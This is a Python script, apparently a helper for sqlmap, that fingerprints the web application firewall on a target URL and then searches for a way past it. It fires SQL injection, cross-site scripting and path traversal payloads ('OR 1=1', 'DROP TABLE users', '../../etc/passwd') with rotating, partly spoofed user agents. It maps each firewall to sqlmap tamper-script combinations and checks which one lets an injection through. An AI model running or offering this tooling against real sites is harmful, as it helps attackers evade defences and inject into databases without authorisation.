#!/usr/bin/env python3
# WAF Identification Module - Advanced fingerprinting of WAF systems
# This is a Python implementation to improve WAF detection accuracy

import sys
import json
import re
import time
import random
import urllib.parse
import subprocess
import requests
from collections import Counter

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Load WAF signatures from identYwaf for more accurate detection
def load_waf_signatures():
    try:
        with open("identywaf/data.json", "r") as f:
            return json.load(f)
    except Exception as e:
        print(f"Error loading WAF signatures: {e}")
        # Fallback to basic signatures if file can't be loaded
        return {
            "cloudflare": ["cloudflare", "cf-ray", "__cfduid"],
            "akamai": ["akamai", "akamaiedge"],
            "imperva": ["incapsula", "imperva"],
            "awswaf": ["aws", "waf", "amazon"],
            "f5bigip": ["f5", "bigip"],
            "sucuri": ["sucuri", "cloudproxy"],
            "modsecurity": ["mod_security", "modsecurity", "owasp crs"],
        }

# WAF test payloads - these are designed to trigger WAF blocks
WAF_TEST_PAYLOADS = [
    "' OR 1=1 -- -",
    "' UNION SELECT 1,2,3,4,5-- -",
    "1'; DROP TABLE users; --",
    "AND 1=2 UNION SELECT 1,2,3,4,@@version,6--",
    "1' AND SLEEP(1) AND '1'='1",
    "' AND extractvalue(rand(),concat(0x7e,(SELECT version()),0x7e))--",
    "' AND (SELECT * FROM (SELECT(SLEEP(1)))a) AND '1'='1",
    "<script>alert(1)</script>",
    "../../etc/passwd",
    "' OR '1'='1' /*"
]

# Headers that may reveal WAF information
WAF_HEADERS = [
    "server",
    "x-powered-by",
    "set-cookie",
    "cookie",
    "via",
    "x-forwarded-for",
    "x-real-ip",
    "x-firewall-protection",
    "x-waf",
    "x-security",
    "x-cache",
    "cf-ray",
    "cf-connecting-ip",
    "x-sucuri-id",
    "x-amzn-waf-"
]

# Custom user agents to test WAF behavior
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
    "sqlmap/1.4.12 (http://sqlmap.org)"
]

def identify_waf(url, timeout=10, user_agent=None):
    """
    Identify WAF using multiple detection methods
    Returns (waf_name, confidence_score, recommended_tamper)
    """
    if not user_agent:
        user_agent = USER_AGENTS[0]
    
    waf_signatures = load_waf_signatures()
    waf_scores = Counter()
    session = requests.Session()
    
    # First, let's check the clean response for WAF signatures
    try:
        clean_response = session.get(
            url,
            headers={"User-Agent": user_agent},
            timeout=timeout,
            verify=False,
            allow_redirects=True
        )
        
        # Store baseline response info for comparison
        baseline_status = clean_response.status_code
        baseline_length = len(clean_response.text)
        baseline_headers = clean_response.headers
        
        # Check for WAF signatures in headers
        for header_name, header_value in baseline_headers.items():
            for waf_name, sigs in waf_signatures.items():
                for sig in sigs:
                    if isinstance(sig, str) and re.search(sig, header_value, re.IGNORECASE):
                        waf_scores[waf_name] += 2
        
        # Check response body for WAF signatures
        for waf_name, sigs in waf_signatures.items():
            for sig in sigs:
                if isinstance(sig, str) and re.search(sig, clean_response.text, re.IGNORECASE):
                    waf_scores[waf_name] += 1
        
    except Exception as e:
        print(f"Error during clean request: {e}")
        return "unknown", 0, "space2comment,between,randomcase"
    
    # Test with malicious payloads to trigger WAF
    for payload in WAF_TEST_PAYLOADS:
        # Randomly select either parameter injection or path injection
        injection_type = random.choice(["param", "path"])
        
        try:
            if injection_type == "param":
                # Parameter injection
                test_url = f"{url}{'&' if '?' in url else '?'}id={urllib.parse.quote(payload)}"
            else:
                # Path injection
                base_url = url.rstrip('/')
                test_url = f"{base_url}/{urllib.parse.quote(payload)}"
            
            # Rotate user agents
            test_agent = random.choice(USER_AGENTS)
            
            start_time = time.time()
            test_response = session.get(
                test_url,
                headers={"User-Agent": test_agent},
                timeout=timeout,
                verify=False,
                allow_redirects=True
            )
            response_time = time.time() - start_time
            
            # Check for WAF behavior (status codes, response time, size differences)
            if test_response.status_code in [403, 406, 429, 500, 501, 502]:
                # Typical WAF block responses
                for waf_name, sigs in waf_signatures.items():
                    for sig in sigs:
                        if isinstance(sig, str):
                            if re.search(sig, test_response.text, re.IGNORECASE):
                                waf_scores[waf_name] += 3
                                
                            # Also check headers for WAF signatures
                            for header_name, header_value in test_response.headers.items():
                                if re.search(sig, str(header_value), re.IGNORECASE):
                                    waf_scores[waf_name] += 3
            
            # Check for response time differences (WAFs often cause delays)
            if response_time > 2.0 and baseline_status != test_response.status_code:
                waf_scores["generic"] += 1
                
            # Check for significant body length changes
            response_length = len(test_response.text)
            length_diff = abs(response_length - baseline_length)
            if length_diff > 500 and baseline_status == test_response.status_code:
                waf_scores["generic"] += 1
                
        except Exception as e:
            # Connection errors might indicate WAF blocks
            waf_scores["generic"] += 1
    
    # Determine the most likely WAF
    most_common = waf_scores.most_common(1)
    if most_common and most_common[0][1] > 2:
        detected_waf, score = most_common[0]
        confidence = min(score / 10.0, 1.0)  # Normalize confidence between 0-1
        
        # Determine recommended tamper techniques based on WAF
        tamper_techniques = get_recommended_tampers(detected_waf)
        return detected_waf, confidence, tamper_techniques
    else:
        return "none", 0.0, "space2comment,between,randomcase"

def get_recommended_tampers(waf_name):
    """Return recommended tamper techniques for the detected WAF"""
    tamper_map = {
        "cloudflare": "space2comment,charencode,randomcase,charunicodeescape",
        "akamai": "space2randomblank,charunicodeencode,between,randomcase",
        "imperva": "modsecurityzeroversioned,space2comment,space2randomblank,randomcase",
        "awswaf": "space2dash,charunicodeencode,equaltolike,greatest,between",
        "f5bigip": "space2morehash,randomcase,charencode,apostrophemask",
        "sucuri": "space2randomblank,charunicodeencode,randomcomments,unionalltounion",
        "modsecurity": "modsecurityversioned,space2comment,space2hash,apostrophemask",
        "wordfence": "space2comment,randomcase,charencode,apostrophemask",
        "generic": "space2comment,between,percentage,randomcase,charunicodeencode,apostrophemask"
    }
    
    return tamper_map.get(waf_name, "space2comment,between,percentage,randomcase")

def test_bypass_effectiveness(url, waf_name, tamper_combo, timeout=10):
    """Test if the tamper techniques effectively bypass the WAF"""
    # Prepare a test command using the tamper combo
    test_payload = "' OR 1=1 -- -"
    
    try:
        # Execute the tamper scripts through Python directly
        tampered_payload = test_payload
        for technique in tamper_combo.split(','):
            tamper_script = f"tamper/{technique}.py"
            try:
                # First try using the Python script directly
                result = subprocess.check_output(
                    ['python3', tamper_script], 
                    input=tampered_payload.encode(), 
                    stderr=subprocess.DEVNULL
                )
                tampered_payload = result.decode().strip()
            except (subprocess.SubprocessError, FileNotFoundError):
                # If error, keep the previous payload
                pass
                
        # URL-encode the tampered payload
        encoded_payload = urllib.parse.quote(tampered_payload)
        
        # Test URL with tampered payload
        test_url = f"{url}{'&' if '?' in url else '?'}id={encoded_payload}"
        
        response = requests.get(
            test_url,
            headers={"User-Agent": random.choice(USER_AGENTS)},
            timeout=timeout,
            verify=False,
            allow_redirects=True
        )
        
        # Return success if we get a 200 OK or similar response
        if response.status_code in [200, 201, 202, 203, 206]:
            return True
        else:
            return False
            
    except Exception as e:
        print(f"Error testing bypass: {e}")
        return False

def get_waf_bypass_strategy(url):
    """
    Master function to detect WAF and find optimal bypass strategy
    Returns a string in format "waf_type:tamper_techniques"
    """
    waf_name, confidence, initial_tamper = identify_waf(url)
    
    if waf_name == "none" or confidence < 0.3:
        print(f"No WAF detected or low confidence ({confidence:.2f})")
        return "none:space2comment,between,percentage,randomcase"
    
    print(f"Detected WAF: {waf_name} (confidence: {confidence:.2f})")
    print(f"Initial tamper techniques: {initial_tamper}")
    
    # Test if initial tamper works
    if test_bypass_effectiveness(url, waf_name, initial_tamper):
        print(f"Initial tamper techniques are effective")
        return f"{waf_name}:{initial_tamper}"
    
    # Try alternative techniques
    alt_tampers = [
        "charunicodeencode,randomcase,space2comment",
        "space2randomblank,charunicodeencode,between",
        "apostrophemask,space2hash,randomcase,between",
        "charunicodeescape,modsecurityversioned,space2hash",
        "percentage,randomcase,charencode,space2comment",
        "apostrophemask,hexentities,randomcase,space2hash"
    ]
    
    for tamper_combo in alt_tampers:
        if test_bypass_effectiveness(url, waf_name, tamper_combo):
            print(f"Found effective bypass: {tamper_combo}")
            return f"{waf_name}:{tamper_combo}"
    
    # If nothing works well, return the initial recommendation
    return f"{waf_name}:{initial_tamper}"

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 waf_identify.py <url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    result = get_waf_bypass_strategy(target_url)
    print(result)
